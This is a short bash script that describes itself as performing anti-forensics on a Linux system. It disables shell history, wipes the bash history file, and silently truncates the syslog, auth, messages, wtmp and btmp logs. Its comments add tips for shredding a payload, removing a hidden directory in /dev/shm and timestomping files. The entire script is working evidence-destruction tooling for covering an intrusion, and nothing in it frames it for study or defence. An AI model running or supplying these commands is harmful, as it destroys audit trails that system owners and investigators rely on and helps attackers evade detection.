#!/bin/bash
# -----------------------------------------------------------------------------
# Performs anti-forensics actions: disables history, wipes logs, and provides
# cleanup suggestions.
# -----------------------------------------------------------------------------

# Disable History for current session
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0

# Clear History File
if [ -f ~/.bash_history ]; then
    cat /dev/null > ~/.bash_history && history -c
fi

# Clear System Logs (requires root)
# Silently attempts to truncate logs
echo > /var/log/syslog 2>/dev/null
echo > /var/log/auth.log 2>/dev/null
echo > /var/log/messages 2>/dev/null
echo > /var/log/wtmp 2>/dev/null
echo > /var/log/btmp 2>/dev/null

# Manual Cleanup Tips (Output to stdout for operator awareness)
# 1. rm -rf /dev/shm/.hidden_dir
# 2. shred -u /tmp/payload
# 3. touch -r /bin/ls modified_file (Timestomp)
